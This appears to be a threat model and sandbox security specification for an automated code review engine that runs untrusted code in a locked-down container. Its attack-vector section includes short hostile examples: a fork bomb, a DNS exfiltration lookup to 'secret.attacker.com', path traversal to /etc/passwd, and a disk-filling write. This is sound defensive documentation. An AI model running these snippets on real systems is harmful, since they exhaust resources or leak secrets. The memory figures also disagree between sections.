# Sandbox Threat Model & Security Architecture

**Document Version:** 1.0.0 (Milestone v1.1 Hardening)  
**Requirement Covered:** `HARD-01`, `HARD-02`  
**Status:** Active Security Specification  
**Classification:** Public Security Documentation  

---

## 1. Executive Summary & Core Principle

Aion is an automated code review engine that inspects, analyzes, and tests pull request diffs, code patches, and synthetic test reproductions. Because input code originates from arbitrary open-source contributors and potentially malicious PR submissions, **all submitted code is classified as untrusted by default**.

### The Non-Negotiable Invariant (Zero Untrusted Host Execution)
> **Rule HARD-01:** Untrusted code runs **exclusively** inside an ephemeral container sandbox. If an active container engine (Docker or Podman) is unavailable, Aion **strictly refuses** execution on the host and falls back to safe static analysis (Python AST validation). In-process subprocess execution of untrusted code on the host machine is completely eliminated.

---

## 2. Threat Landscape & Protected Assets

| Asset | Impact of Compromise | Primary Threat Vectors |
| :--- | :--- | :--- |
| **Host Secrets & Tokens** | High (`GITHUB_TOKEN`, `HF_TOKEN`, cloud credentials) | Environment variable inspection, reading `.env`, token scraping |
| **Host Filesystem** | Critical (Source code destruction, backdoor injection) | Path traversal, symlink dereferencing, overwriting `/proc` or system binaries |
| **Network Perimeter** | High (Botnet participation, data exfiltration) | Outbound HTTP/TCP sockets, DNS tunneling, local network port scans |
| **Host Resources** | Medium (Denial of Service, cluster starvation) | Fork bombs, memory allocation bombs, infinite loops, disk fills |

---

## 3. Defense-in-Depth Container Architecture (HARD-02)

When patch execution or verification is requested, Aion spins up an ephemeral, rootless container bounded by 9 layers of containment:

```
┌────────────────────────────────────────────────────────┐
│                   Ephemeral Container                  │
│                                                        │
│  User: 1000:1000 (Non-root)                            │
│  Root Filesystem: READ-ONLY (/)                        │
│  Security Profile: no-new-privileges                   │
│  Capabilities: ALL DROPPED (--cap-drop ALL)            │
│  Network: NONE (--network none)                        │
│  PIDs Limit: 64 (--pids-limit 64)                      │
│  Memory Limit: 512MB (--memory 512m)                   │
│  CPU Limit: 1.0 Core (--cpus 1.0)                      │
│  Scratch Storage: 64MB tmpfs (/tmp, noexec/nosuid)     │
│  Mounts: Code mounted READ-ONLY (/sandbox:ro)          │
└────────────────────────────────────────────────────────┘
```

### Exact Command Shape
```bash
docker run --rm \
  --network none \
  --cap-drop ALL \
  --security-opt no-new-privileges \
  --pids-limit 64 \
  --memory 512m \
  --cpus 1.0 \
  --read-only \
  --user 1000:1000 \
  --tmpfs /tmp:rw,size=64m,mode=1777 \
  -v /path/to/ephemeral_dir:/sandbox:ro \
  -w /tmp \
  python:3.10-slim \
  python /sandbox/entrypoint.py
```

---

## 4. Attack Vectors & Verified Mitigations

### 4.1 Remote Code Execution (RCE) on Host
- **Threat:** Malicious Python code attempts to execute shell commands on the host via `os.system()`, `subprocess.Popen()`, or C-extensions.
- **Mitigation:** Code executes only inside an isolated container namespace. In environments without Docker/Podman, `SandboxRunner.run_code()` returns `exit_code: 126` and `security_violation: "Container runtime missing; execution refused on host"`.

### 4.2 Fork Bombs & PID Exhaustion
- **Threat:** Code spawns thousands of processes (`while True: os.fork()`) or threads to freeze the host OS.
- **Mitigation:** `--pids-limit 64` terminates any further process creation once 64 PIDs are allocated, raising `Resource temporarily unavailable` and killing the container without impacting the host.

### 4.3 Outbound Data Exfiltration & DNS Leaks
- **Threat:** Code connects to an external command-and-control server or uses DNS lookups (`socket.getaddrinfo('secret.attacker.com', 53)`) to exfiltrate tokens.
- **Mitigation:** `--network none` strips all virtual network interfaces except the loopback (`lo`), rendering both TCP/UDP connections and DNS lookups inoperative.

### 4.4 Filesystem Traversal & Symlink Attacks
- **Threat:** Code attempts to traverse out of the sandbox via relative paths (`../../etc/passwd`) or creates symlinks to read host files.
- **Mitigation:** 
  1. Root filesystem `/` is mounted strictly `--read-only`.
  2. Input script directory is mounted `:ro` (read-only).
  3. The only writable mount is `/tmp` as a temporary in-memory `tmpfs`.
  4. Docker isolates the container mount namespace from the host root.

### 4.5 Writes via `/proc` or Kernel Structures
- **Threat:** Attacker attempts to modify kernel memory or write to `/proc/sys/` to escape containment.
- **Mitigation:** `--cap-drop ALL` strips `CAP_SYS_ADMIN`, `CAP_DAC_OVERRIDE`, and `CAP_NET_ADMIN`. Combined with non-root UID `1000:1000` and `--read-only`, kernel and proc manipulation returns `Permission denied` or `Read-only file system`.

### 4.6 Privilege Escalation via SUID
- **Threat:** Attacker invokes SUID binaries (`sudo`, `su`, `mount`) inside the container image to gain root.
- **Mitigation:** `--security-opt no-new-privileges` prevents processes from gaining additional privileges through SUID bits or `execve`.

### 4.7 Host Credential & Environment Variable Leakage
- **Threat:** Code reads `os.environ` to inspect host credentials (`GITHUB_TOKEN`, `HF_TOKEN`, `AWS_SECRET_ACCESS_KEY`).
- **Mitigation:** The container runs with a sanitized, isolated environment dictionary containing only essential system variables (`PATH`, `PYTHONUNBUFFERED`, `PYTHONHASHSEED`). Host secrets are never injected into the container environment.

### 4.8 Disk Quota & Storage Exhaustion
- **Threat:** Malicious payload generates multi-gigabyte files (`open('fill.dat', 'wb').write(b'0' * 10**10)`) to fill host disk space.
- **Mitigation:** Writable storage is restricted to an in-memory `tmpfs` sized at `64MB` (`--tmpfs /tmp:rw,size=64m`). Allocations exceeding 64MB immediately fail with `No space left on device` without touching physical host storage.

---

## 5. Verification & Compliance Matrix

| Requirement | Test Name | Verification Mechanism | Status |
|---|---|---|:---:|
| **HARD-01** | `test_untrusted_host_execution_strictly_refused` | `SandboxRunner(force_fallback=True)` returns `exit_code: 126` | Verified ✅ |
| **HARD-01** | `test_patch_verification_static_analysis_fallback_valid` | Patch verified via AST parse without host subprocess | Verified ✅ |
| **HARD-02** | `test_container_command_hardening_flags` | Asserts all 9 container hardening flags are present in command | Verified ✅ |
| **HARD-02** | `test_threat_vector_outbound_network_blocked` | Sockets raise PermissionError / Security Violation | Verified ✅ |
| **HARD-02** | `test_threat_vector_dns_exfiltration_blocked` | Outbound DNS resolution denied | Verified ✅ |
| **HARD-02** | `test_threat_vector_filesystem_write_outside_sandbox_blocked` | Writes outside sandbox directory blocked | Verified ✅ |
| **HARD-02** | `test_threat_vector_cpu_timeout_loop` | Infinite loops terminated within configured timeout | Verified ✅ |
| **HARD-02** | `test_threat_vector_memory_ceiling_exhaustion` | 1GB allocation in 128MB container intercepted | Verified ✅ |
| **HARD-02** | `test_threat_vector_env_and_token_leakage` | Verifies sensitive host tokens are not in container env | Verified ✅ |
| **HARD-02** | `test_threat_vector_proc_writes_forbidden` | Writes to `/proc` forbidden | Verified ✅ |
